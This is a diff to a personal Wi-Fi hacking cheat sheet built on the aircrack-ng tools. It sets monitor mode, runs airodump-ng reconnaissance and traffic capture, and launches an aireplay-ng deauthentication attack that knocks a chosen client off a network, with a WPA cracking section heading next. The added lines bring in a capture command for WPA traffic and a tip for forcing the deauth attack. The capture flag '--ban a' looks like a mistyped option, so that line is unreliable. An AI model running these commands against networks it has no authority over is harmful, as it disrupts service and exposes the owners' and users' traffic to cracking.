@@ -1,4 +1,4 @@
-###### WI-FI HACKING ######
+###### WI-FI WEP HACKING ######
 
 Note: ALL ACTIONS MUST BE TAKEN IN ROOT OR USE SUDO AND WIFI ADAPTER MUST BE IN MONITOR MODE
 
@@ -11,7 +11,7 @@ airmon-ng start wlan0
 
 
 
-##### RECONNAISANCE #######
+###### RECONNAISANCE #######
 
 airodump wlan0
 
@@ -24,7 +24,7 @@ airodump-ng -c <channel number> --bssid <router bssid> -w <file name / desired l
 
 TIP: The BSSID number is also the device MAC address
 
-
+airodump-ng --ban a -w <desired_file_name> wlan0 -->> suitable for capturing wpa traffic.
 
 ########## DEAUTHENTICATION ATTACK ##########
 
@@ -32,6 +32,7 @@ command-->> aireplay-ng --deauth <number_of_deauth_packets> -a <wifi_bssid> -c <
 						Alternatively
 	    aireplay-ng -0 <number_of_deuath_packets> -a <wifi_bssid> -c <target_bssid> wlan0
 
+TIP: -D flag can be added to force the attack.
 
 ######## WPA CRACKING #########
 
